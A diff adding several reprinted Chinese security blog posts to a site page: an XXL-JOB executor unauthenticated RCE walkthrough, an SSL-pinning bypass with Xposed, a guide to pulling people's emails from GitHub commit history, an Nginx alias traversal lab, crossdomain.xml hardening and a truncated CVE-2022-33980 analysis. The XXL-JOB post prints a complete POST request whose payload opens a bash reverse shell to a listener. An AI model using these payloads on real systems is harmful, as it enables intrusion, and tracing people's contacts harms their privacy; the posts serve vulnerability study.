@@ -86,6 +86,423 @@
 
     
         <h2 class="title">
+            <a href="/2023/09/03/XXL-JOB-Executor/">
+                XXL-JOB executor未授权访问漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="xxl-job-executor未授权访问漏洞">XXL-JOB executor未授权访问漏洞</span></h1><h2><span id="漏洞详情">漏洞详情</span></h2><blockquote>
+<p>XXL-JOB是一个轻量级分布式任务调度平台。默认情况下XXL-JOB的Restful API接口或RPC接口没有配置认证措施，未授权的攻击者可构造恶意请求，造成远程执行命令，直接控制服务器。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
+<p>XXL-JOB &lt;&#x3D; 2.2.0</p>
+</blockquote>
+<h2><span id="漏洞分析">漏洞分析</span></h2><blockquote>
+<p>XXL-JOB的Restful API分为两种，一个 调度中心Restful API，一个 执行器Restful API。其中在执行器Restful API的任务触发声明中，发送请求的数据格式为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">地址格式：</span><br><span class="line">    &#123;执行器内嵌服务跟地址&#125;/run 	<span class="comment">//也就是说为executor端的地址，ip:9999/run</span></span><br><span class="line"> </span><br><span class="line">Header： </span><br><span class="line">    XXL-JOB-ACCESS-TOKEN : &#123;请求令牌&#125; 	</span><br><span class="line"> </span><br><span class="line">请求数据格式如下，放置在 RequestBody 中，JSON格式： </span><br><span class="line">&#123; </span><br><span class="line">    <span class="string">&quot;jobId&quot;</span>:<span class="number">1</span>, <span class="comment">// 任务ID </span></span><br><span class="line">    <span class="string">&quot;executorHandler&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务标识 </span></span><br><span class="line">    <span class="string">&quot;executorParams&quot;</span>:<span class="string">&quot;demoJobHandler&quot;</span>, <span class="comment">// 任务参数 </span></span><br><span class="line">    <span class="string">&quot;executorBlockStrategy&quot;</span>:<span class="string">&quot;COVER_EARLY&quot;</span>, <span class="comment">// 任务阻塞策略，可选值参考   com.xxl.job.core.enums.ExecutorBlockStrategyEnum </span></span><br><span class="line">    <span class="string">&quot;executorTimeout&quot;</span>:<span class="number">0</span>, <span class="comment">// 任务超时时间，单位秒，大于零时生效 </span></span><br><span class="line">    <span class="string">&quot;logId&quot;</span>:<span class="number">1</span>, <span class="comment">// 本次调度日志ID </span></span><br><span class="line">    <span class="string">&quot;logDateTime&quot;</span>:<span class="number">1586629003729</span>, <span class="comment">// 本次调度日志时间 </span></span><br><span class="line">    <span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;BEAN&quot;</span>, <span class="comment">// 任务模式，可选值参考 com.xxl.job.core.glue.GlueTypeEnum 		&quot;glueSource&quot;:&quot;xxx&quot;, // GLUE脚本代码 </span></span><br><span class="line">    <span class="string">&quot;glueUpdatetime&quot;</span>:<span class="number">1586629003727</span>, <span class="comment">// GLUE脚本更新时间，用于判定脚本是否变更以及是否需要刷新 </span></span><br><span class="line">    <span class="string">&quot;broadcastIndex&quot;</span>:<span class="number">0</span>, <span class="comment">// 分片参数：当前分片 </span></span><br><span class="line">    <span class="string">&quot;broadcastTotal&quot;</span>:<span class="number">0</span> <span class="comment">// 分片参数：总分片 </span></span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">响应数据格式： </span><br><span class="line">    &#123; <span class="string">&quot;code&quot;</span>: <span class="number">200</span>, <span class="comment">// 200 表示正常、其他失败 &quot;msg&quot;: null // 错误提示消息 &#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>其中”glueType”:”BEAN” 任务模式的选值如下</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BEAN(<span class="string">&quot;BEAN&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_GROOVY(<span class="string">&quot;GLUE(Java)&quot;</span>, <span class="literal">false</span>, <span class="literal">null</span>, <span class="literal">null</span>),</span><br><span class="line">GLUE_SHELL(<span class="string">&quot;GLUE(Shell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;.sh&quot;</span>), </span><br><span class="line">GLUE_PYTHON(<span class="string">&quot;GLUE(Python)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;python&quot;</span>, <span class="string">&quot;.py&quot;</span>), </span><br><span class="line">GLUE_PHP(<span class="string">&quot;GLUE(PHP)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;php&quot;</span>, <span class="string">&quot;.php&quot;</span>), </span><br><span class="line">GLUE_NODEJS(<span class="string">&quot;GLUE(Nodejs)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;node&quot;</span>, <span class="string">&quot;.js&quot;</span>), </span><br><span class="line">GLUE_POWERSHELL(<span class="string">&quot;GLUE(PowerShell)&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;powershell&quot;</span>, <span class="string">&quot;.ps1&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>也就是说我们可以从中任意选择一种脚本语言，然后在”glueSource”:”xxx”中插入相对应的脚本代码即可执行相对应的命令。</p>
+<p>比如对方如果是linux系统的服务器，那么就可以构造反弹shell命令执行代码为：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;glueType&quot;</span>:<span class="string">&quot;GLUE_SHELLl&quot;</span>，</span><br><span class="line"><span class="string">&quot;glueSource&quot;</span>:<span class="string">&quot;/bin/bash / -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2><span id="漏洞利用">漏洞利用</span></h2><blockquote>
+<p>访问XXL-JOB存在漏洞版本的客户端（executor），利用burpsuite发送如下payload：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: ip:<span class="number">9999</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">Accept-Language: en</span></span><br><span class="line"><span class="comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/json</span></span><br><span class="line"><span class="comment">Content-Length: 394</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  &quot;jobId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;executorHandler&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorParams&quot;: &quot;demoJobHandler&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorBlockStrategy&quot;: &quot;COVER_EARLY&quot;,</span></span><br><span class="line"><span class="comment">  &quot;executorTimeout&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;logId&quot;: 1,</span></span><br><span class="line"><span class="comment">  &quot;logDateTime&quot;: 1586629003729,</span></span><br><span class="line"><span class="comment">  &quot;glueType&quot;: &quot;GLUE_SHELL&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueSource&quot;: &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.30.1/5555 0&gt;&amp;1&quot;,</span></span><br><span class="line"><span class="comment">  &quot;glueUpdatetime&quot;: 1586699003758,</span></span><br><span class="line"><span class="comment">  &quot;broadcastIndex&quot;: 0,</span></span><br><span class="line"><span class="comment">  &quot;broadcastTotal&quot;: 0</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><img src="/2023/09/03/XXL-JOB-Executor/1.png" alt="image"></p>
+<p>开启监听后，即可反弹回shell</p>
+<p><img src="/2023/09/03/XXL-JOB-Executor/2.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XXL-JOB/" rel="tag">XXL-JOB</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Xposed-HTTPS/">
+                夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="夜神模拟器xposed框架justtrustme用来禁用-绕过-ssl-证书检查来突破ssl-pinning">夜神模拟器+Xposed框架+JustTrustMe（用来禁用、绕过 SSL 证书检查）来突破SSL Pinning</span></h1><blockquote>
+<p>1.夜神模拟器官网下载安装 模拟器</p>
+<p>2.创建一个安卓5.1版本的模拟器</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/1.png" alt="image"></p>
+<p>3.把xposed.apk  拖入夜神模拟器 （ Android 5.1.版本，xposed3.1.5 版本） </p>
+<p><img src="/2023/09/03/Xposed-HTTPS/2.png" alt="image"></p>
+<p>4.安装xposed框架</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/3.png" alt="image"></p>
+<p><img src="/2023/09/03/Xposed-HTTPS/4.png" alt="image"></p>
+<p><img src="/2023/09/03/Xposed-HTTPS/5.png" alt="image"></p>
+<p>下载安装完成后， 重启系统</p>
+<p>5.安装JustTrustMe.apk   </p>
+<p>点击“模块”，此时还没有可用的模块，同样的方法点击apk+导入之前下载好的JustTrustMe的apk安装包，系统会自动安装，安装完成后，在模块里面点击“软重启”，再次打开“模块”界面，即可看到JustTrustMe，勾选一下，启用这个模块：</p>
+<p><img src="/2023/09/03/Xposed-HTTPS/6.png" alt="image"></p>
+<p>6.重启生效， 接下载安装 fiddler证书， 设置WLAN代理</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSL/" rel="tag">SSL</a><a class="tag-none-link" href="/tags/Xposed/" rel="tag">Xposed</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Github-Find-Email/">
+                如何通过 Github 找到一个人？
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="如何通过-github-找到一个人">如何通过 Github 找到一个人？</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.ixiqin.com/2020/01/08/how-to-find-a-person-through-making/#:~:text=%E6%83%B3%E8%A6%81%E9%80%9A%E8%BF%87%20Git%20%E6%89%BE%E5%88%B0%E4%B8%80%E4%B8%AA%E4%BA%BA%E7%9A%84%E9%82%AE%E7%AE%B1%EF%BC%8C%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%96%B9%E6%B3%95%E5%B0%B1%E6%98%AF%E4%BD%BF%E7%94%A8%20Github%20%E6%8F%90%E4%BE%9B%E7%9A%84%20GraphQL%20%E6%9D%A5%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%EF%BC%8C%E7%AE%80%E5%8D%95%E6%96%B9%E4%BE%BF%E3%80%82%20%E8%AE%BF%E9%97%AE,in%20%EF%BC%8C%E4%BD%BF%E7%94%A8%E4%BD%A0%E7%9A%84%20Github%20%E8%B4%A6%E5%8F%B7%E7%99%BB%E9%99%86%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%B0%83%E7%94%A8%20Github%20%E7%9A%84%20API%20%E4%BA%86%E3%80%82">白宦成</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>很多时候，我们都需要找到一个人的联系方式。但是，并不是每一次我们都可以很好的拿到他的联系方式，这个时候，我们就需要借助一些奇技淫巧来找到一个人的联系方式。</p>
+</blockquote>
+<h2><span id="requirements">Requirements</span></h2><blockquote>
+<p>Github 账号</p>
+<p>你要找的人的 GitHub 账号（需要其账号下有仓库）</p>
+</blockquote>
+<h2><span id="原理">原理</span></h2><blockquote>
+<p>在我们使用 Git 进行版本控制时，一开始，我们会被要求设置一个 Git 的用户名和邮箱，就像下面这样。</p>
+<p><img src="/2023/09/03/Github-Find-Email/1.png" alt="image"></p>
+<p>后续，我们的每一个 Commit 都会基于我们填写的用户名和邮箱来进行存储。我们只需要查询一个人在 Github 的提交记录，就可以找到他填写在 Git 中的邮箱和名字，从而方便我们更进一步找到这个人。</p>
+</blockquote>
+<h2><span id="实践">实践</span></h2><blockquote>
+<p>想要通过 Git 找到一个人的邮箱，最简单的方法就是使用 Github 提供的 GraphQL 来进行查询，简单方便。</p>
+<p>访问Github 的 GraphQL API Explorer，点击右侧的 Sign in ，使用你的 Github 账号登陆，这样就可以调用 Github 的 API 了。</p>
+<p><img src="/2023/09/03/Github-Find-Email/2.png" alt="image"></p>
+<p>登陆后，你下方的 GraphQL 输入框就可以输入内容了。在其中输入如下代码</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  repository(name: <span class="string">&quot;grank&quot;</span>, owner: <span class="string">&quot;lctt&quot;</span>) &#123;</span><br><span class="line">    ref(qualifiedName: <span class="string">&quot;master&quot;</span>) &#123;</span><br><span class="line">      target &#123;</span><br><span class="line">        ... on Commit &#123;</span><br><span class="line">          id</span><br><span class="line">          <span class="title function_">history</span><span class="params">(first: <span class="number">5</span>)</span> &#123;</span><br><span class="line">            edges &#123;</span><br><span class="line">              node &#123;</span><br><span class="line">                author &#123;</span><br><span class="line">                  name</span><br><span class="line">                  email</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>并将 name 替换为你要查询的人的 repo 名，owner 改为你需要查询的人的名字，然后点击执行按钮。</p>
+<p><img src="/2023/09/03/Github-Find-Email/3.png" alt="image"></p>
+<p>右侧会出现你的执行结果，你会发现，其中出现我们想要的“邮箱”地址。</p>
+<p><img src="/2023/09/03/Github-Find-Email/4.png" alt="image"></p>
+<p>你会发现，这里其实有两种类型的邮箱，一种是我们常见的，自己用的各种免费邮箱，比如 @qq.com、@gmail.com、@foxmail.com 之类的；另一种是形如 27856297+dependabot-preview[bot]@users.noreply.github.com 这样的邮箱。</p>
+<p>这两种邮箱的区别是，前者是我们自己通过 git 设置的邮箱，而后者则是我们通过 Github 网页、 API 操作产生的 commit 。你在查询的时候，要记得去找第一类邮箱来作为参考。</p>
+<p>当然，不排除有开发者在看了本篇文章后，去用 private 邮箱修改自己本地的 Git ，那就没办法了。</p>
+<p>找到这个邮箱以后怎么办呢？</p>
+<p>直接发邮件联系<br>如果是 QQ 邮箱、 Foxmail ，可以试着直接用邮箱，或者邮箱里的 QQ 号加好友。<br>通过 Google 搜索这个邮箱，查找其他的关联信息。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Github/" rel="tag">Github</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Nginx-Alias/">
+                Nginx错误配置alias导致目录遍历漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="nginx错误配置alias导致目录遍历漏洞">Nginx错误配置alias导致目录遍历漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blackwolfsec.cc/2018/05/23/Nginx_alias_misconfig_path_traversle/">BlackWolf</a> 并作补充</p>
+</blockquote>
+<h2><span id="0x00-前言">0x00 前言</span></h2><blockquote>
+<p>nginx错误配置alias，导致存在目录遍历，可跳出限制读取上一层目录及其任意子目录的文件的任意文件。</p>
+</blockquote>
+<h2><span id="0x01-环境搭建">0x01 环境搭建</span></h2><blockquote>
+<p>使用richarvey&#x2F;nginx-php-fpm镜像</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 80:80  richarvey/nginx-php-fpm</span><br></pre></td></tr></table></figure>
+
+<p>配置nginx，添加配置test路由解析到&#x2F;var&#x2F;www&#x2F;html&#x2F;路径（注意：&#x2F;test没有结尾的&#x2F;）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /etc/nginx/sites-available/default.conf</span><br><span class="line">location /test &#123;</span><br><span class="line">        alias /var/www/html/;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>对应Web服务的文件结构，目标是目录遍历获取flag.txt的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">|--var</span><br><span class="line">   |--www</span><br><span class="line">      |--flag.txt</span><br><span class="line">      |--html</span><br><span class="line">         |--index.php</span><br><span class="line">         |--test.txt</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="0x02-漏洞利用">0x02 漏洞利用</span></h2><blockquote>
+<p>通过访问<a target="_blank" rel="noopener" href="http://127.0.0.1/test/test.txt">http://127.0.0.1/test/test.txt</a></p>
+<p>可以成功访问到test的内容如下(&#x2F;test&#x2F;test.txt路由请求，经处理后转换成：&#x2F;var&#x2F;www&#x2F;html&#x2F;test.txt)：</p>
+<p><code>this is a test</code></p>
+<p>修改请求为<a target="_blank" rel="noopener" href="http://127.0.0.1/test../flag.txt%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E8%B7%B3%E5%88%B0%E4%B8%8A%E4%B8%80%E5%B1%82%E7%9B%AE%E5%BD%95%E4%B8%8B%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%88%B0flag.txt%E7%9A%84%E5%86%85%E5%AE%B9(%60/test../flag.txt%60%E8%B7%AF%E7%94%B1%E8%AF%B7%E6%B1%82%EF%BC%8C%E7%BB%8F%E5%A4%84%E7%90%86%E5%90%8E%E8%BD%AC%E6%8D%A2%E6%88%90%EF%BC%9A%60/var/www/flag.txt%60)">http://127.0.0.1/test../flag.txt，可以成功跳到上一层目录下，读取到flag.txt的内容(`/test../flag.txt`路由请求，经处理后转换成：`/var/www/flag.txt`)</a></p>
+<p><code>you get me, hahaha</code></p>
+</blockquote>
+<h2><span id="0x03-小结">0x03 小结</span></h2><blockquote>
+<p>只能跳到上一层目录，读取上一层目录及其任意子目录的文件，不能任意目录遍历读取任意文件,有局限性。</p>
+<p>需要nginx配置缺陷，实战情况比较有限，但是真实存在（如：参考链接3）。</p>
+<p>一种场景是：很多网站会把备份文件放置在网页目录的上一层路径下，利用遍历读取备份文件；另一种场景是：路由限制到上传或静态图片路径，利用遍历读取上一层路径下的配置文件等。</p>
+</blockquote>
+<h2><span id="0x04-参考链接">0x04 参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md">https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/317201">https://hackerone.com/reports/317201</a><br><a target="_blank" rel="noopener" href="https://hackerone.com/reports/312510">https://hackerone.com/reports/312510</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/Crossdomain-XML/">
+                怎么把网站crossdomain.xml配置风险去除
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="怎么把网站crossdomainxml配置风险去除">怎么把网站crossdomain.xml配置风险去除</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://codeantenna.com/a/AoJYq0YYQe">nanjingbolg</a> 并作补充</p>
+</blockquote>
+<blockquote>
+<p>打开程序目录下的crossdomain.xml文件，确保配置只对提供安全资源的可信域开放：</p>
+<p>源代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE cross-domain-policy SYSTEM ”http://www.macromedia.com/xml/dtds/cross-domain-policy.dtd”&gt;&lt;cross-domain-policy&gt;&lt;allow-access-from domain=”*” /&gt;&lt;/cross-domain-policy&gt;</span><br></pre></td></tr></table></figure>
+
+<p>文件中的allow-access-from 实体设置为星号设置为允许任何域访问，将其修改为:</p>
+<p><code>&lt;allow-access-from domain=”*.17showshow.com” /&gt;</code></p>
+<p>*.17showshow.com 换为您自己的域名(注意是一级域名)。</p>
+<p>表示只允许本域访问，该问题就解决了。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XML/" rel="tag">XML</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/03/CVE-2022-33980-Apache-Commons/">
+                关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析
+            </a>
+        </h2>
+    
+    <time>
+        Sep 3, 2023
+    </time>
+    <section class="content">
+        <h1><span id="关于cve-2022-33980-apache-commons-configuration-远程命令执行漏洞分析">关于CVE-2022-33980 Apache Commons Configuration 远程命令执行漏洞分析</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/543936119">星阑科技</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>7月6日，Apache官方发布安全公告，修复了一个存在于Apache Commons Configuration 组件的远程代码执行漏洞，漏洞编号：CVE-2022-33980，漏洞威胁等级：高危。恶意攻击者通过该漏洞，可在目标服务器上实现任意代码执行。</p>
+</blockquote>
+<h2><span id="相关介绍">相关介绍</span></h2><blockquote>
+<p>Apache Commons Configuration是一个Java应用程序的配置管理工具，可以从properties或者xml文件中加载软件的配置信息，用来构建支撑软件运行的基础环境。在一些配置文件较多较复杂的情况下，使用该配置工具比较可以简化配置文件的解析和管理，提高开发效率和软件的可维护性。</p>
+</blockquote>
+<h2><span id="利用范围">利用范围</span></h2><blockquote>
+<p>2.4 &lt;&#x3D; Apache Commons Configuration &lt;&#x3D;2.7</p>
+</blockquote>
+<h2><span id="前置知识">前置知识</span></h2><blockquote>
+<p>什么是变量插值？</p>
+<p>通常我们用apach的configuration2库来管理配置文件(org.apache.commons:commons-configuration2),在commons-configuration2管理的配置文件中，配置变量的值可以引用变量。举个例子：${env:xxhzz}就指代环境变量xxhzz，在commons-configuration2中这种引用动态变量的方式就叫变量插值。</p>
+<p>变量插值解析：在commons-configuration2中，负责对字符串中的变量进行解析的是org.apache.commons.configuration2.interpol.ConfigurationInterpolator类中的interpolate(Object)方法。</p>
+</blockquote>
+<h2><span id="漏洞原理">漏洞原理</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/1.png" alt="image"></p>
+<p>从漏洞通告中，可以得知Apache Commons Configuration执行变量插值，允许动态评估和扩展属性。插值的标准格式是“${prefix:name}”，其中“prefix”用于定位执行插值的org.apache.commons.configuration2.interpol.Lookup 实例。</p>
+<p>从2.4版到2.7版，默认的Lookup实例集包括可能导致任意代码执行或与远程服务器联系的插值器。如公告中提到“script” 可使用JVM脚本执行引擎(javax.script)执行表达式，若使用了不受信任的配置值，在受影响的版本中使用插值默认值的应用程序就很可能受到远程代码执行的影响。</p>
+</blockquote>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>了解了漏洞原理后，为更好理解漏洞的形成，需构建一个调试的demo环境。</p>
+<p>通过maven直接引入Apache Commons Configuration2.7。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/2.png" alt="image"></p>
+<p>接着构建一个触发漏洞的主类即可</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/3.png" alt="image"></p>
+</blockquote>
+<h2><span id="动态调式">动态调式</span></h2><blockquote>
+<p>在对插值变量进行解析的地方打下断点。</p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#interpolate</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/4.png" alt="image"></p>
+<p>开启debug模式，在经过了前两个if判断之后，随后会进入resolveSingleVariable函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/5.png" alt="image"></p>
+<p>在org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolveSingleVariable中首先跟一下extractVariableName函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/6.png" alt="image"></p>
+<p>org.apache.commons.configuration2.interpol.ConfigurationInterpolator#extractVariableName的作用是提取变量字符串strValue。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/7.png" alt="image"></p>
+<p>随后进入org.apache.commons.configuration2.interpol.ConfigurationInterpolator#resolve函数中，通过index0f查找和判断条件，从变量字符串中分别获取到prefix和name。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/8.png" alt="image"></p>
+<p>继续跟进会进入lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/9.png" alt="image"></p>
+<p>在分析lookup函数前先跟进下fetchLookupForPrefix函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/10.png" alt="image"></p>
+<p>fetchLookupForPrefix函数的作用是获取到stringLookup对象。</p>
+<p>继续跟进，会进入commons-text-1.8.jar包中的org.apache.commons.text.lookup.ScriptStringLookup#lookup函数。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/11.png" alt="image"></p>
+<p>在org.apache.commons.text.lookup.ScriptStringLookup#lookup函数中会再次对字符串进行分割，分别提取engineName和script。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/12.png" alt="image"></p>
+<p>接着会通过getEngineByName函数获取ScriptEngine（javax.script)。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/13.png" alt="image"></p>
+<p>继续往下，出现eval函数。而我们知道eval函数可计算某个字符串，并执行其中的的JavaScript 代码。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/14.png" alt="image"></p>
+<p>继续往下将成功触发我们传入的payload，造成远程命令执行。</p>
+</blockquote>
+<h2><span id="漏洞复现">漏洞复现</span></h2><blockquote>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/15.png" alt="image"></p>
+<p>​成功命令执行。</p>
+<p><img src="/2023/09/03/CVE-2022-33980-Apache-Commons/16.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复建议">修复建议</span></h2><blockquote>
